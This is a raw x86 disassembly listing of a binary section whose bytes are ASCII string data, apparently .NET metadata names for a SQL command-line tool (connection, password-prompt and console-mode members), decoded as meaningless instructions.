  407e09:	arpl   WORD PTR [eax+eax*1+0x67],si
  407e0d:	gs je  0x407e6f
  407e10:	inc    ebx
  407e11:	outs   dx,DWORD PTR ds:[esi]
  407e12:	outs   dx,BYTE PTR ds:[esi]
  407e13:	je     0x407e87
  407e15:	popa   
  407e16:	arpl   WORD PTR [eax+eax*1+0x5f],si
  407e1a:	jae    0x407e81
  407e1c:	arpl   WORD PTR [ebp+0x72],si
  407e1f:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x5f746567
  407e27:	push   ebx
  407e28:	arpl   WORD PTR gs:[ebp+0x72],si
  407e2c:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x6d6f7246
  407e34:	push   ebx
  407e35:	gs jb  0x407eae
  407e38:	imul   esp,DWORD PTR [ebx+0x65],0x536f5400
  407e3f:	gs jb  0x407eb8
  407e42:	imul   esp,DWORD PTR [ebx+0x65],0x6e6f4300
  407e49:	je     0x407ebd
  407e4b:	popa   
  407e4c:	arpl   WORD PTR [eax+eax*1+0x53],si
  407e50:	arpl   WORD PTR gs:[ebp+0x72],si
  407e54:	imul   esi,DWORD PTR [ecx+edi*2+0x0],0x5073695f
  407e5c:	jb     0x407ec3
  407e5e:	jae    0x407ec5
  407e60:	outs   dx,BYTE PTR ds:[esi]
  407e61:	je     0x407e63
  407e63:	addr16 gs je 0x407ec6
  407e67:	dec    ecx
  407e68:	jae    0x407eba
  407e6a:	jb     0x407ed1
  407e6c:	jae    0x407ed3
  407e6e:	outs   dx,BYTE PTR ds:[esi]
  407e6f:	je     0x407e71
  407e71:	jae    0x407ed8
  407e73:	je     0x407ed4
  407e75:	dec    ecx
  407e76:	jae    0x407ec8
  407e78:	jb     0x407edf
  407e7a:	jae    0x407ee1
  407e7c:	outs   dx,BYTE PTR ds:[esi]
  407e7d:	je     0x407e7f
  407e7f:	pop    edi
  407e80:	jae    0x407ee7
  407e82:	jb     0x407efa
  407e84:	gs jb  0x407e87
  407e87:	addr16 gs je 0x407eea
  407e8b:	push   ebx
  407e8c:	gs jb  0x407f05
  407e8f:	gs jb  0x407e92
  407e92:	pop    edi
  407e93:	fs popa 
  407e95:	je     0x407ef8
  407e97:	bound  esp,QWORD PTR [ecx+0x73]
  407e9a:	add    BYTE PTR gs:[edi+0x65],ah
  407e9e:	je     0x407eff
  407ea0:	inc    esp
  407ea1:	popa   
  407ea2:	je     0x407f05
  407ea4:	bound  esp,QWORD PTR [ecx+0x73]
  407ea7:	add    BYTE PTR gs:[edi+0x6c],bl
  407eab:	outs   dx,DWORD PTR ds:[esi]
  407eac:	imul   ebp,DWORD PTR [bp+0x49],0x65670064
  407eb4:	je     0x407f15
  407eb6:	dec    esp
  407eb7:	outs   dx,DWORD PTR ds:[esi]
  407eb8:	imul   ebp,DWORD PTR [bp+0x49],0x705f0064
  407ec0:	popa   
  407ec1:	jae    0x407f36
  407ec3:	ja     0x407f34
  407ec5:	jb     0x407f2b
  407ec7:	add    BYTE PTR [edi+0x65],ah
  407eca:	je     0x407f2b
  407ecc:	push   eax
  407ecd:	popa   
  407ece:	jae    0x407f43
  407ed0:	ja     0x407f41
  407ed2:	jb     0x407f38
  407ed4:	add    BYTE PTR [edi+0x73],bl
  407ed7:	jae    0x407f49
  407ed9:	imul   eax,DWORD PTR [eax],0x5f746567
  407edf:	push   ebx
  407ee0:	jae    0x407f52
  407ee2:	imul   eax,DWORD PTR [eax],0x676f6c5f
  407ee8:	imul   ebp,DWORD PTR [esi+0x54],0x6f656d69
  407eef:	jne    0x407f65
  407ef1:	add    BYTE PTR [edi+0x65],ah
  407ef4:	je     0x407f55
  407ef6:	dec    esp
  407ef7:	outs   dx,DWORD PTR ds:[esi]
  407ef8:	imul   ebp,DWORD PTR [bp+0x54],0x6f656d69
  407f00:	jne    0x407f76
  407f02:	add    BYTE PTR [ecx+0x73],cl
  407f05:	push   eax
  407f06:	jb     0x407f6d
  407f08:	jae    0x407f6f
  407f0a:	outs   dx,BYTE PTR ds:[esi]
  407f0b:	je     0x407f0d
  407f0d:	dec    esp
  407f0e:	outs   dx,DWORD PTR ds:[esi]
  407f0f:	imul   ebp,DWORD PTR [bp+0x49],0x61500064
  407f17:	jae    0x407f8c
  407f19:	ja     0x407f8a
  407f1b:	jb     0x407f81
  407f1d:	add    BYTE PTR [ebx+0x73],dl
  407f20:	jo     0x407f8b
  407f22:	add    BYTE PTR [edi+ebp*2+0x67],cl
  407f26:	imul   ebp,DWORD PTR [esi+0x54],0x6f656d69
  407f2d:	jne    0x407fa3
  407f2f:	add    BYTE PTR [edi+0x65],bl
  407f32:	outs   dx,BYTE PTR ds:[esi]
  407f33:	arpl   WORD PTR [edx+0x79],si
  407f36:	jo     0x407fac
  407f38:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  407f3f:	pop    edi
  407f40:	inc    ebp
  407f41:	outs   dx,BYTE PTR ds:[esi]
  407f42:	arpl   WORD PTR [edx+0x79],si
  407f45:	jo     0x407fbb
  407f47:	imul   ebp,DWORD PTR [edi+0x6e],0x636e4500
  407f4e:	jb     0x407fc9
  407f50:	jo     0x407fc6
  407f52:	imul   ebp,DWORD PTR [edi+0x6e],0x6d785f00
  407f59:	ins    BYTE PTR es:[edi],dx
  407f5a:	add    BYTE PTR [edi+0x65],ah
  407f5d:	je     0x407fbe
  407f5f:	pop    eax
  407f60:	ins    DWORD PTR es:[edi],dx
  407f61:	ins    BYTE PTR es:[edi],dx
  407f62:	add    BYTE PTR [edi+0x6c],bl
  407f65:	gs jbe 0x407fcd
  407f68:	ins    BYTE PTR es:[edi],dx
  407f69:	add    BYTE PTR [edi+0x65],ah
  407f6c:	je     0x407fcd
  407f6e:	dec    esp
  407f6f:	gs jbe 0x407fd7
  407f72:	ins    BYTE PTR es:[edi],dx
  407f73:	add    BYTE PTR [edi+0x63],bl
  407f76:	outs   dx,DWORD PTR ds:[esi]
  407f77:	outs   dx,BYTE PTR ds:[esi]
  407f78:	outs   dx,BYTE PTR ds:[esi]
  407f79:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  407f7e:	outs   dx,BYTE PTR ds:[esi]
  407f7f:	add    BYTE PTR [edi+0x65],ah
  407f82:	je     0x407fe3
  407f84:	inc    ebx
  407f85:	outs   dx,DWORD PTR ds:[esi]
  407f86:	outs   dx,BYTE PTR ds:[esi]
  407f87:	outs   dx,BYTE PTR ds:[esi]
  407f88:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  407f8d:	outs   dx,BYTE PTR ds:[esi]
  407f8e:	add    BYTE PTR [edi+0x68],bl
  407f91:	gs ins BYTE PTR es:[edi],dx
  407f93:	jo     0x407f95
  407f95:	addr16 gs je 0x407ff8
  407f99:	dec    eax
  407f9a:	gs ins BYTE PTR es:[edi],dx
  407f9c:	jo     0x407f9e
  407f9e:	push   ebx
  407f9f:	jns    0x408014
  407fa1:	je     0x408008
  407fa3:	ins    DWORD PTR es:[edi],dx
  407fa4:	cs inc ebx
  407fa6:	outs   dx,DWORD PTR ds:[esi]
  407fa7:	ins    BYTE PTR es:[edi],dx
  407fa8:	ins    BYTE PTR es:[edi],dx
  407fa9:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  407fae:	outs   dx,BYTE PTR ds:[esi]
  407faf:	jae    0x407fdf
  407fb1:	inc    edi
  407fb2:	outs   dx,BYTE PTR gs:[esi]
  407fb4:	gs jb  0x408020
  407fb7:	arpl   WORD PTR [eax],ax
  407fb9:	inc    esp
  407fba:	imul   esp,DWORD PTR [ebx+0x74],0x616e6f69
  407fc1:	jb     0x40803c
  407fc3:	pusha  
  407fc4:	xor    al,BYTE PTR [eax]
  407fc6:	pop    edi
  407fc7:	imul   esp,DWORD PTR [edi+0x6e],0x6465726f
  407fce:	inc    ebp
  407fcf:	jb     0x408043
  407fd1:	outs   dx,DWORD PTR ds:[esi]
  407fd2:	jb     0x408047
  407fd4:	add    BYTE PTR [ecx+0x64],al
  407fd7:	fs dec ecx
  407fd9:	outs   dx,BYTE PTR ds:[si]
  407fdb:	outs   dx,DWORD PTR ds:[esi]
  407fdc:	jb     0x408043
  407fde:	add    BYTE PTR [ecx+0x73],cl
  407fe1:	dec    ecx
  407fe2:	outs   dx,BYTE PTR ds:[si]
  407fe4:	outs   dx,DWORD PTR ds:[esi]
  407fe5:	jb     0x40804c
  407fe7:	add    BYTE PTR fs:[eax+0x6d],bl
  407feb:	ins    BYTE PTR es:[edi],dx
  407fec:	add    BYTE PTR [ebx+0x6f],al
  407fef:	outs   dx,BYTE PTR ds:[esi]
  407ff0:	outs   dx,BYTE PTR ds:[esi]
  407ff1:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  407ff6:	outs   dx,BYTE PTR ds:[esi]
  407ff7:	add    BYTE PTR [eax+0x65],cl
  407ffa:	ins    BYTE PTR es:[edi],dx
  407ffb:	jo     0x407ffd
  407ffd:	pop    edi
  407ffe:	jbe    0x408061
  408000:	ins    BYTE PTR es:[edi],dx
  408001:	jne    0x408068
  408003:	add    BYTE PTR [edi+0x66],bl
  408006:	dec    ecx
  408007:	jae    0x408059
  408009:	jb     0x408070
  40800b:	jae    0x408072
  40800d:	outs   dx,BYTE PTR ds:[esi]
  40800e:	je     0x408010
  408010:	addr16 gs je 0x408073
  408014:	push   esi
  408015:	popa   
  408016:	ins    BYTE PTR es:[edi],dx
  408017:	jne    0x40807e
  408019:	add    BYTE PTR [ebx+0x65],dl
  40801c:	je     0x40801e
  40801e:	push   esp
  40801f:	outs   dx,DWORD PTR ds:[esi]
  408020:	push   ebx
  408021:	je     0x408095
  408023:	imul   ebp,DWORD PTR [esi+0x67],0x6c615600
  40802a:	jne    0x408091
  40802c:	add    BYTE PTR [edi+0x53],bl
  40802f:	push   ecx
  408030:	dec    esp
  408031:	inc    ebx
  408032:	dec    ebp
  408033:	inc    esp
  408034:	push   eax
  408035:	inc    ecx
  408036:	push   ebx
  408037:	push   ebx
  408038:	push   edi
  408039:	dec    edi
  40803a:	push   edx
  40803b:	inc    esp
  40803c:	add    BYTE PTR [edi+0x53],bl
  40803f:	push   ecx
  408040:	dec    esp
  408041:	inc    ebx
  408042:	dec    ebp
  408043:	inc    esp
  408044:	push   ebx
  408045:	inc    ebp
  408046:	push   edx
  408047:	push   esi
  408048:	inc    ebp
  408049:	push   edx
  40804a:	add    BYTE PTR [edi+0x53],bl
  40804d:	push   ecx
  40804e:	dec    esp
  40804f:	inc    ebx
  408050:	dec    ebp
  408051:	inc    esp
  408052:	dec    esp
  408053:	dec    edi
  408054:	inc    edi
  408055:	dec    ecx
  408056:	dec    esi
  408057:	push   esp
  408058:	dec    ecx
  408059:	dec    ebp
  40805a:	inc    ebp
  40805b:	dec    edi
  40805c:	push   ebp
  40805d:	push   esp
  40805e:	add    BYTE PTR [ebx+0x54],dl
  408061:	inc    esp
  408062:	pop    edi
  408063:	dec    ecx
  408064:	dec    esi
  408065:	push   eax
  408066:	push   ebp
  408067:	push   esp
  408068:	pop    edi
  408069:	dec    eax
  40806a:	inc    ecx
  40806b:	dec    esi
  40806c:	inc    esp
  40806d:	dec    esp
  40806e:	inc    ebp
  40806f:	add    BYTE PTR [ebp+0x4e],al
  408072:	inc    ecx
  408073:	inc    edx
  408074:	dec    esp
  408075:	inc    ebp
  408076:	pop    edi
  408077:	inc    ebp
  408078:	inc    ebx
  408079:	dec    eax
  40807a:	dec    edi
  40807b:	pop    edi
  40807c:	dec    ecx
  40807d:	dec    esi
  40807e:	push   eax
  40807f:	push   ebp
  408080:	push   esp
  408081:	add    BYTE PTR [edi+0x65],al
  408084:	je     0x4080d9
  408086:	je     0x4080ec
  408088:	dec    eax
  408089:	popa   
  40808a:	outs   dx,BYTE PTR ds:[esi]
  40808b:	fs ins BYTE PTR es:[edi],dx
  40808d:	add    BYTE PTR gs:[edi+0x65],al
  408091:	je     0x4080d6
  408093:	outs   dx,DWORD PTR ds:[esi]
  408094:	outs   dx,BYTE PTR ds:[esi]
  408095:	jae    0x408106
  408097:	ins    BYTE PTR es:[edi],dx
  408098:	gs dec ebp
  40809a:	outs   dx,DWORD PTR ds:[esi]
  40809b:	fs add BYTE PTR gs:[ebx+0x65],dl
  4080a0:	je     0x4080e5
  4080a2:	outs   dx,DWORD PTR ds:[esi]
  4080a3:	outs   dx,BYTE PTR ds:[esi]
  4080a4:	jae    0x408115
  4080a6:	ins    BYTE PTR es:[edi],dx
  4080a7:	gs dec ebp
  4080a9:	outs   dx,DWORD PTR ds:[esi]
  4080aa:	fs add BYTE PTR gs:[edi+0x65],ah
  4080af:	je     0x408110
  4080b1:	dec    eax
  4080b2:	inc    ebp
  4080b3:	dec    esp
  4080b4:	push   eax
  4080b5:	push   esp
  4080b6:	inc    ebp
  4080b7:	pop    eax
  4080b8:	push   esp
  4080b9:	pop    edi
  4080ba:	inc    ebx
  4080bb:	push   ebp
  4080bc:	dec    esp
  4080bd:	push   esp
  4080be:	push   ebp
  4080bf:	push   edx
  4080c0:	inc    ebp
  4080c1:	pop    edi
  4080c2:	dec    esi
  4080c3:	inc    ebp
  4080c4:	push   ebp
  4080c5:	push   esp
  4080c6:	push   edx
  4080c7:	inc    ecx
  4080c8:	dec    esp
  4080c9:	add    BYTE PTR [edi+0x63],bl
  4080cc:	outs   dx,DWORD PTR ds:[esi]
  4080cd:	outs   dx,BYTE PTR ds:[esi]
  4080ce:	outs   dx,BYTE PTR ds:[esi]
  4080cf:	arpl   WORD PTR gs:[ebx+edx*2+0x74],si
  4080d4:	jb     0x40813f
  4080d6:	outs   dx,BYTE PTR ds:[esi]
  4080d7:	addr16 inc esi
  4080d9:	jb     0x40814a
  4080db:	ins    DWORD PTR es:[edi],dx
  4080dc:	add    BYTE PTR [edi+0x65],ah
  4080df:	je     0x408140
  4080e1:	inc    ebx
  4080e2:	outs   dx,DWORD PTR ds:[esi]
  4080e3:	outs   dx,BYTE PTR ds:[esi]
  4080e4:	outs   dx,BYTE PTR ds:[esi]
  4080e5:	arpl   WORD PTR gs:[ebx+edx*2+0x74],si
  4080ea:	jb     0x408155
  4080ec:	outs   dx,BYTE PTR ds:[esi]
  4080ed:	addr16 inc esi
  4080ef:	jb     0x408160
  4080f1:	ins    DWORD PTR es:[edi],dx
  4080f2:	add    BYTE PTR [edi+0x63],bl
  4080f5:	outs   dx,DWORD PTR ds:[esi]
  4080f6:	outs   dx,BYTE PTR ds:[esi]
  4080f7:	outs   dx,BYTE PTR ds:[esi]
  4080f8:	arpl   WORD PTR gs:[ebx+edx*2+0x74],si
  4080fd:	jb     0x408168
  4080ff:	outs   dx,BYTE PTR ds:[esi]
  408100:	addr16 push esp
  408102:	outs   dx,DWORD PTR ds:[esi]
  408103:	add    BYTE PTR [edi+0x65],ah
  408106:	je     0x408167
  408108:	inc    ebx
  408109:	outs   dx,DWORD PTR ds:[esi]
  40810a:	outs   dx,BYTE PTR ds:[esi]
  40810b:	outs   dx,BYTE PTR ds:[esi]
  40810c:	arpl   WORD PTR gs:[ebx+edx*2+0x74],si
  408111:	jb     0x40817c
  408113:	outs   dx,BYTE PTR ds:[esi]
  408114:	addr16 push esp
  408116:	outs   dx,DWORD PTR ds:[esi]
  408117:	add    BYTE PTR [edi+0x63],bl
  40811a:	outs   dx,DWORD PTR ds:[esi]
  40811b:	outs   dx,BYTE PTR ds:[esi]
  40811c:	outs   dx,BYTE PTR ds:[esi]
  40811d:	arpl   WORD PTR gs:[ebx+edx*2+0x74],si
  408122:	jb     0x40818d
  408124:	outs   dx,BYTE PTR ds:[esi]
  408125:	addr16 inc esi
  408127:	jb     0x408198
  408129:	ins    DWORD PTR es:[edi],dx
  40812a:	dec    ebp
  40812b:	imul   esi,DWORD PTR [edx+0x72],0x6700726f
  408132:	gs je  0x408194
  408135:	inc    ebx
  408136:	outs   dx,DWORD PTR ds:[esi]
  408137:	outs   dx,BYTE PTR ds:[esi]
  408138:	outs   dx,BYTE PTR ds:[esi]
  408139:	arpl   WORD PTR gs:[ebx+edx*2+0x74],si
  40813e:	jb     0x4081a9
  408140:	outs   dx,BYTE PTR ds:[esi]
  408141:	addr16 inc esi
  408143:	jb     0x4081b4
  408145:	ins    DWORD PTR es:[edi],dx
  408146:	dec    ebp
  408147:	imul   esi,DWORD PTR [edx+0x72],0x5f00726f
  40814e:	arpl   WORD PTR [edi+0x6e],bp
  408151:	outs   dx,BYTE PTR ds:[esi]
  408152:	arpl   WORD PTR gs:[ebx+edx*2+0x74],si
  408157:	jb     0x4081c2
  408159:	outs   dx,BYTE PTR ds:[esi]
  40815a:	addr16 push esp
  40815c:	outs   dx,DWORD PTR ds:[esi]
  40815d:	dec    ebp
  40815e:	imul   esi,DWORD PTR [edx+0x72],0x6700726f
  408165:	gs je  0x4081c7
  408168:	inc    ebx
  408169:	outs   dx,DWORD PTR ds:[esi]
  40816a:	outs   dx,BYTE PTR ds:[esi]
  40816b:	outs   dx,BYTE PTR ds:[esi]
  40816c:	arpl   WORD PTR gs:[ebx+edx*2+0x74],si
  408171:	jb     0x4081dc
  408173:	outs   dx,BYTE PTR ds:[esi]
  408174:	addr16 push esp
  408176:	outs   dx,DWORD PTR ds:[esi]
  408177:	dec    ebp
  408178:	imul   esi,DWORD PTR [edx+0x72],0x4700726f
  40817f:	gs je  0x4081c5
  408182:	outs   dx,DWORD PTR ds:[esi]
  408183:	outs   dx,BYTE PTR ds:[esi]
  408184:	outs   dx,BYTE PTR ds:[esi]
  408185:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40818a:	outs   dx,BYTE PTR ds:[esi]
  40818b:	push   ebx
  40818c:	je     0x408200
  40818e:	imul   ebp,DWORD PTR [esi+0x67],0x74654700
  408195:	inc    ebx
  408196:	outs   dx,DWORD PTR ds:[esi]
  408197:	outs   dx,BYTE PTR ds:[esi]
  408198:	outs   dx,BYTE PTR ds:[esi]
  408199:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  40819e:	outs   dx,BYTE PTR ds:[esi]
  40819f:	push   eax
  4081a0:	popa   
  4081a1:	jae    0x408216
  4081a3:	ja     0x408214
  4081a5:	jb     0x40820b
  4081a7:	add    BYTE PTR [ebx+0x6c],dl
  4081aa:	popa   
  4081ab:	jae    0x408215
  4081ad:	push   esp
  4081ae:	outs   dx,DWORD PTR ds:[esi]
  4081af:	imul   esp,DWORD PTR [ebp+0x6e],0x73
  4081b3:	add    BYTE PTR [esi+0x72],al
  4081b6:	gs gs push esp
  4081b9:	outs   dx,DWORD PTR ds:[esi]
  4081ba:	imul   esp,DWORD PTR [ebp+0x6e],0x73
  4081be:	add    BYTE PTR [ebx+0x68],al
  4081c1:	popa   
  4081c2:	jb     0x408218
  4081c4:	outs   dx,DWORD PTR ds:[esi]
  4081c5:	imul   esp,DWORD PTR [ebp+0x6e],0x73
  4081c9:	add    BYTE PTR [edi+0x65],al
  4081cc:	je     0x408222
  4081ce:	outs   dx,DWORD PTR ds:[esi]
  4081cf:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  4081d3:	pop    edi
  4081d4:	outs   dx,BYTE PTR gs:[si]
  4081d7:	gs jb  0x40823b
  4081da:	ins    BYTE PTR es:[edi],dx
  4081db:	dec    edi
  4081dc:	jo     0x408252
  4081de:	imul   ebp,DWORD PTR [edi+0x6e],0x65670073
  4081e5:	je     0x408246
  4081e7:	inc    edi
  4081e8:	outs   dx,BYTE PTR gs:[esi]
  4081ea:	gs jb  0x40824e
  4081ed:	ins    BYTE PTR es:[edi],dx
  4081ee:	dec    edi
  4081ef:	jo     0x408265
  4081f1:	imul   ebp,DWORD PTR [edi+0x6e],0x635f0073
  4081f8:	outs   dx,DWORD PTR ds:[esi]
  4081f9:	outs   dx,BYTE PTR ds:[esi]
  4081fa:	imul   sp,WORD PTR [edi+0x75],0x6172
  408200:	je     0x40826b
  408202:	outs   dx,DWORD PTR ds:[esi]
  408203:	outs   dx,BYTE PTR ds:[esi]
  408204:	dec    edi
  408205:	jo     0x40827b
  408207:	imul   ebp,DWORD PTR [edi+0x6e],0x65670073
  40820e:	je     0x40826f
  408210:	inc    ebx
  408211:	outs   dx,DWORD PTR ds:[esi]
  408212:	outs   dx,BYTE PTR ds:[esi]
  408213:	imul   sp,WORD PTR [edi+0x75],0x6172
  408219:	je     0x408284
  40821b:	outs   dx,DWORD PTR ds:[esi]
  40821c:	outs   dx,BYTE PTR ds:[esi]
  40821d:	dec    edi
  40821e:	jo     0x408294
  408220:	imul   ebp,DWORD PTR [edi+0x6e],0x725f0073
  408227:	jne    0x408297
  408229:	je     0x408294
  40822b:	ins    DWORD PTR es:[edi],dx
  40822c:	gs dec edi
  40822e:	jo     0x4082a4
  408230:	imul   ebp,DWORD PTR [edi+0x6e],0x65670073
  408237:	je     0x408298
  408239:	push   edx
  40823a:	jne    0x4082aa
  40823c:	je     0x4082a7
  40823e:	ins    DWORD PTR es:[edi],dx
  40823f:	gs dec edi
  408241:	jo     0x4082b7
  408243:	imul   ebp,DWORD PTR [edi+0x6e],0x615f0073
  40824a:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  40824e:	outs   dx,BYTE PTR ds:[esi]
  40824f:	add    BYTE PTR [edi+0x65],ah
  408252:	je     0x4082b3
  408254:	inc    ecx
  408255:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  408259:	outs   dx,BYTE PTR ds:[esi]
  40825a:	add    BYTE PTR [eax+0x61],dl
  40825d:	jb     0x4082d2
  40825f:	add    BYTE PTR gs:[eax+0x61],dl
  408263:	jb     0x4082d8
  408265:	gs push edx
  408267:	jne    0x4082d7
  408269:	je     0x4082d4
  40826b:	ins    DWORD PTR es:[edi],dx
  40826c:	add    BYTE PTR gs:[eax+0x61],dl
  408270:	jb     0x4082e5
  408272:	gs inc ebx
  408274:	outs   dx,DWORD PTR ds:[esi]
  408275:	outs   dx,BYTE PTR ds:[esi]
  408276:	imul   sp,WORD PTR [edi+0x75],0x6172
  40827c:	je     0x4082e7
  40827e:	outs   dx,DWORD PTR ds:[esi]
  40827f:	outs   dx,BYTE PTR ds:[esi]
  408280:	add    BYTE PTR [ebp+0x78],al
  408283:	jo     0x4082ea
  408285:	arpl   WORD PTR [esp+edx*2+0x6f],si
  408289:	imul   esp,DWORD PTR [ebp+0x6e],0x0
  40828d:	push   eax
  40828e:	popa   
  40828f:	jb     0x408304
  408291:	gs inc edi
  408293:	outs   dx,BYTE PTR gs:[esi]
  408295:	gs jb  0x4082f9
  408298:	ins    BYTE PTR es:[edi],dx
  408299:	add    BYTE PTR [eax+0x61],dl
  40829c:	jb     0x408311
  40829e:	gs inc ebx
  4082a0:	outs   dx,DWORD PTR ds:[esi]
  4082a1:	outs   dx,BYTE PTR ds:[esi]
  4082a2:	outs   dx,BYTE PTR ds:[esi]
  4082a3:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4082a8:	outs   dx,BYTE PTR ds:[esi]
  4082a9:	push   ebx
  4082aa:	je     0x40830d
  4082ac:	je     0x408313
  4082ae:	add    BYTE PTR [eax+0x45],cl
  4082b1:	dec    esp
  4082b2:	push   eax
  4082b3:	push   esp
  4082b4:	inc    ebp
  4082b5:	pop    eax
  4082b6:	push   esp
  4082b7:	pop    edi
  4082b8:	inc    ebx
  4082b9:	push   ebp
  4082ba:	dec    esp
  4082bb:	push   esp
  4082bc:	push   ebp
  4082bd:	push   edx
  4082be:	inc    ebp
  4082bf:	pop    edi
  4082c0:	dec    esi
  4082c1:	inc    ebp
  4082c2:	push   ebp
  4082c3:	push   esp
  4082c4:	push   edx
  4082c5:	inc    ecx
  4082c6:	dec    esp
  4082c7:	add    BYTE PTR [ebx+0x6f],al
  4082ca:	outs   dx,BYTE PTR ds:[esi]
  4082cb:	outs   dx,BYTE PTR ds:[esi]
  4082cc:	arpl   WORD PTR gs:[ebx+edx*2+0x74],si
  4082d1:	jb     0x40833c
  4082d3:	outs   dx,BYTE PTR ds:[esi]
  4082d4:	addr16 inc esi
  4082d6:	jb     0x408347
  4082d8:	ins    DWORD PTR es:[edi],dx
  4082d9:	add    BYTE PTR [ebx+0x6f],al
  4082dc:	outs   dx,BYTE PTR ds:[esi]
  4082dd:	outs   dx,BYTE PTR ds:[esi]
  4082de:	arpl   WORD PTR gs:[ebx+edx*2+0x74],si
  4082e3:	jb     0x40834e
  4082e5:	outs   dx,BYTE PTR ds:[esi]
  4082e6:	addr16 push esp
  4082e8:	outs   dx,DWORD PTR ds:[esi]
  4082e9:	add    BYTE PTR [ebx+0x6f],al
  4082ec:	outs   dx,BYTE PTR ds:[esi]
  4082ed:	outs   dx,BYTE PTR ds:[esi]
  4082ee:	arpl   WORD PTR gs:[ebx+edx*2+0x74],si
  4082f3:	jb     0x40835e
  4082f5:	outs   dx,BYTE PTR ds:[esi]
  4082f6:	addr16 inc esi
  4082f8:	jb     0x408369
  4082fa:	ins    DWORD PTR es:[edi],dx
  4082fb:	dec    ebp
  4082fc:	imul   esi,DWORD PTR [edx+0x72],0x4300726f
  408303:	outs   dx,DWORD PTR ds:[esi]
  408304:	outs   dx,BYTE PTR ds:[esi]
  408305:	outs   dx,BYTE PTR ds:[esi]
  408306:	arpl   WORD PTR gs:[ebx+edx*2+0x74],si
  40830b:	jb     0x408376
  40830d:	outs   dx,BYTE PTR ds:[esi]
  40830e:	addr16 push esp
  408310:	outs   dx,DWORD PTR ds:[esi]
  408311:	dec    ebp
  408312:	imul   esi,DWORD PTR [edx+0x72],0x4100726f
  408319:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  40831d:	outs   dx,BYTE PTR ds:[esi]
  40831e:	add    BYTE PTR [esi+0x61],dh
  408321:	ins    BYTE PTR es:[edi],dx
  408322:	jne    0x408389
  408324:	pop    edi
  408325:	pop    edi
  408326:	add    BYTE PTR [edi+0x65],al
  408329:	outs   dx,BYTE PTR ds:[esi]
  40832a:	gs jb  0x40838e
  40832d:	ins    BYTE PTR es:[edi],dx
  40832e:	add    BYTE PTR [ebx+0x6f],al
  408331:	outs   dx,BYTE PTR ds:[esi]
  408332:	imul   sp,WORD PTR [edi+0x75],0x6172
  408338:	je     0x4083a3
  40833a:	outs   dx,DWORD PTR ds:[esi]
  40833b:	outs   dx,BYTE PTR ds:[esi]
  40833c:	add    BYTE PTR [edx+0x75],dl
  40833f:	outs   dx,BYTE PTR ds:[esi]
  408340:	je     0x4083ab
  408342:	ins    DWORD PTR es:[edi],dx
  408343:	add    BYTE PTR gs:[ebp+0x6e],al
  408347:	add    BYTE PTR fs:[ecx+0x6e],al
  40834b:	jns    0x40834d
  40834d:	dec    ecx
  40834e:	outs   dx,BYTE PTR ds:[si]
  408350:	outs   dx,DWORD PTR ds:[esi]
  408351:	jb     0x4083b8
  408353:	add    BYTE PTR [esi+0x6f],cl
  408356:	outs   dx,BYTE PTR ds:[esi]
  408357:	add    BYTE PTR gs:[edi+ebp*2+0x67],cl
  40835c:	imul   ebp,DWORD PTR [esi+0x0],0x656d6954
  408363:	outs   dx,DWORD PTR ds:[esi]
  408364:	jne    0x4083da
  408366:	add    BYTE PTR [esi+0x72],al
  408369:	outs   dx,DWORD PTR ds:[esi]
  40836a:	ins    DWORD PTR es:[edi],dx
  40836b:	add    BYTE PTR [esi+0x72],al
  40836e:	outs   dx,DWORD PTR ds:[esi]
  40836f:	ins    DWORD PTR es:[edi],dx
  408370:	push   ebx
  408371:	gs jb  0x4083ea
  408374:	imul   esp,DWORD PTR [ebx+0x65],0x656d614e
  40837b:	add    BYTE PTR [esi+0x72],al
  40837e:	outs   dx,DWORD PTR ds:[esi]
  40837f:	ins    DWORD PTR es:[edi],dx
  408380:	inc    ebx
  408381:	outs   dx,DWORD PTR ds:[esi]
  408382:	outs   dx,BYTE PTR ds:[esi]
  408383:	outs   dx,BYTE PTR ds:[esi]
  408384:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  408389:	outs   dx,BYTE PTR ds:[esi]
  40838a:	add    BYTE PTR [esi+0x72],al
  40838d:	outs   dx,DWORD PTR ds:[esi]
  40838e:	ins    DWORD PTR es:[edi],dx
  40838f:	dec    ebp
  408390:	imul   esi,DWORD PTR [edx+0x72],0x5400726f
  408397:	outs   dx,DWORD PTR ds:[esi]
  408398:	add    BYTE PTR [edi+ebp*2+0x53],dl
  40839c:	gs jb  0x408415
  40839f:	imul   esp,DWORD PTR [ebx+0x65],0x656d614e
  4083a6:	add    BYTE PTR [edi+ebp*2+0x53],dl
  4083aa:	gs jb  0x408423
  4083ad:	imul   esp,DWORD PTR [ebx+0x65],0x6974704f
  4083b4:	outs   dx,DWORD PTR ds:[esi]
  4083b5:	outs   dx,BYTE PTR ds:[esi]
  4083b6:	popa   
  4083b7:	ins    BYTE PTR es:[edi],dx
  4083b8:	inc    edx
  4083b9:	dec    ecx
  4083ba:	add    BYTE PTR [edi+ebp*2+0x53],dl
  4083be:	gs jb  0x408437
  4083c1:	imul   esp,DWORD PTR [ebx+0x65],0x54004942
  4083c8:	outs   dx,DWORD PTR ds:[esi]
  4083c9:	inc    ebx
  4083ca:	outs   dx,DWORD PTR ds:[esi]
  4083cb:	outs   dx,BYTE PTR ds:[esi]
  4083cc:	outs   dx,BYTE PTR ds:[esi]
  4083cd:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4083d2:	outs   dx,BYTE PTR ds:[esi]
  4083d3:	add    BYTE PTR [edi+ebp*2+0x4d],dl
  4083d7:	imul   esi,DWORD PTR [edx+0x72],0x4f00726f
  4083de:	outs   dx,BYTE PTR ds:[esi]
  4083df:	inc    ebx
  4083e0:	outs   dx,DWORD PTR ds:[esi]
  4083e1:	outs   dx,BYTE PTR ds:[esi]
  4083e2:	je     0x408456
  4083e4:	popa   
  4083e5:	arpl   WORD PTR [eax+eax*1+0x43],si
